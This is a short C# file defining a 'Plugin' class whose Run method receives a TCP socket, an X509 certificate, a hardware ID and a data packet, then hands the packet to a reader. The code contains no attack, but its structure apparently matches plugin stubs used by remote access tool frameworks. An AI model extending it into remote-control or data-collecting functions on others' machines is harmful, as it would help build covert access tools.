using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		Packet.Read(Pack);
	}
}
